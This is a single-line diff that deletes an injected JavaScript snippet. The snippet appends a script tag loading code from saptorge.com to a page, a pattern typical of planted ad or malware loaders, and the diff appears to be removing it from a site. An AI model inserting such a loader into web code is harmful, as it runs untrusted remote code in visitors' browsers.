@@ -1,1 +1,0 @@
-(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('saptorge.com',7526841,document.createElement('script'))
